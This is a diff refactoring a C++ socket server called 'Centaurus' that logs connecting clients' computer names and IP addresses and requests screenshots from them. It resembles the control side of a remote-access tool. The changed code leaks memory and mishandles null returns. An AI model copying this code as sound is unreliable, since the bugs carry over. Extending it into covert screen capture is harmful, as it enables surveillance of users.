@@ -99,22 +99,8 @@ void Server::CopyReceivedString(const char* source, char* destination, size_t de
 void Server::handleClient(const SOCKET clientSocket) {
     FClientInfo clientInfo;
 
-    char buf[4096];
     while (m_serverRunning) {
-        ZeroMemory(buf, 4096);
-        int bytesReceived = recv(clientSocket, buf, 4096, 0);
-        
-        // Обработка полученных данных
-        if (bytesReceived <= 0) {
-            std::cerr << "Client disconnected or error occurred." << std::endl;
-            break;
-        }
-
-        // Добавляем нулевой символ для корректного окончания строки
-        buf[bytesReceived] = '\0';
-
-        // Преобразуем буфер в строку
-        std::string command(buf);
+        std::string command = receiveString(clientSocket);
 
         if (command == "/connect") {
             char* receivedTime = receiveString(clientSocket);
@@ -133,8 +119,7 @@ void Server::handleClient(const SOCKET clientSocket) {
             std::cerr << "Computer Name: " << clientInfo.name << "\n";
             std::cerr << "IP Address: " << clientInfo.ipv4 << "\n";
         }
-        
-        if (command == Centaurus::cmd::screenshot) {
+        else if (command == Centaurus::cmd::screenshot) {
             std::cout << "Requesting screenshot..." << std::endl;
 
             // Получаем размер данных скриншота
@@ -188,16 +173,14 @@ char* Server::receiveString(SOCKET clientSocket) {
         return nullptr;
     }
 
-    // Получаем данные строки
     std::vector<char> stringData = receiveData(clientSocket, strSize);
     if (stringData.empty()) {
         return nullptr;
     }
 
-    // Преобразуем данные в строку
     char* buffer = new char[strSize + 1];
     std::copy(stringData.begin(), stringData.end(), buffer);
-    buffer[strSize] = '\0'; // Нулевой символ
+    buffer[strSize] = '\0';
 
     return buffer;
 }
